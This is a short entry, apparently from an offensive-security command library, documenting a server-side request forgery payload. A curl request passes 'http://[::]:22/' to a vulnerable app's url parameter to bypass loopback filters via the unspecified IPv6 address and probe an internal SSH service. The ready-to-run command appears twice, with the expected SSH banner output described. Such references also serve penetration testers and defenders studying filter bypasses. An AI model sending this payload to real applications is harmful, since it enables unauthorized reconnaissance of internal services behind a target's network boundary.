---
type: command
executor: bash
data: 'curl "http://$_TARGET_APP/ssrf?url=http://[::]:22/"'
output: null
platforms:
  - Web
tags:
  - ssrf
  - ipv6
  - ssh
verified: true
validated: true
---

# access-internal-ssh-via-ssrf-ipv6-unspecified

## Command

```bash
curl "http://$_TARGET_APP/ssrf?url=http://[::]:22/"
```

## Description

Uses SSRF to probe an internal SSH service on port 22 via IPv6 loopback bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_APP | Vulnerable app URL | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/ssrf?url=http://[::]:22/"
```

## Expected Output

SSH banner like "SSH-2.0-OpenSSH_7.4" if accessible, or timeout/error.

## Related

- [[procedures/Bypass-SSRF-Filters-with-IPv6-Loopback-Addresses]]
